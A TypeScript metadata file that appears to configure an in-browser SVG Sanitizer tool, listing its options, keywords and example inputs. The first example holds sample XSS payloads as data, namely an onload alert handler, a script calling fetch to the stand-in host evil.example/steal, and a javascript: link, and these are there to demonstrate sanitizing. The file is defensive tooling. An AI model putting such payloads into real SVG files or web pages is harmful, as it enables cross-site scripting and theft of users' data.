import type { ToolMeta } from '@/lib/types';

export const meta: ToolMeta = {
  id: 'svg-sanitizer',
  name: 'SVG Sanitizer',
  category: 'security',
  summary:
    'Strip scripts, event handlers and external references from an SVG, and report what changed.',
  description:
    'Paste or drop an SVG and get a hardened copy with active content removed: script elements, on* event handlers, javascript: URLs, foreignObject and embedded frames, unsafe CSS in style elements or attributes, XML processing instructions, the DOCTYPE and external or data: references. Every change is listed so you can review it, and audit mode reports the changes without producing a file.',
  keywords: [
    'svg sanitizer',
    'svg xss',
    'remove script from svg',
    'onload attribute',
    'foreignObject',
    'safe svg',
    'svg security',
    'untrusted svg',
  ],
  privacy: { processing: 'on-device', network: 'none', offline: true },
  input: 'file',
  accept: '.svg,image/svg+xml,text/xml,application/xml',
  acceptsText: true,
  options: [
    {
      key: 'action',
      label: 'Action',
      type: 'select',
      choices: [
        { value: 'clean', label: 'Clean and download' },
        { value: 'audit', label: 'Audit only (no file)' },
      ],
      default: 'clean',
    },
    {
      key: 'externalRefs',
      label: 'References outside the document',
      type: 'select',
      choices: [
        { value: 'strip', label: 'Remove them' },
        { value: 'keep', label: 'Keep them' },
      ],
      default: 'strip',
    },
    {
      key: 'stripComments',
      label: 'Remove comments',
      type: 'boolean',
      default: true,
    },
  ],
  examples: [
    {
      title: 'An SVG with a script and an event handler',
      input:
        '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" onload="alert(1)">\n  <script>fetch("https://evil.example/steal")</script>\n  <circle cx="60" cy="60" r="50" fill="#0af"/>\n  <a href="javascript:alert(2)"><text x="10" y="110">click</text></a>\n</svg>',
    },
    {
      title: 'Audit an SVG without exporting a file',
      input:
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect width="10" height="10"/></svg>',
      options: { action: 'audit' },
    },
    {
      title: 'Keep external references and comments',
      input:
        '<svg xmlns="http://www.w3.org/2000/svg"><!-- note --><image href="https://example.com/a.png" width="10" height="10"/></svg>',
      options: { externalRefs: 'keep', stripComments: false },
    },
  ],
  related: ['svg-optimizer', 'svg-to-png', 'security-headers', 'html-validator'],
  status: 'stable',
};
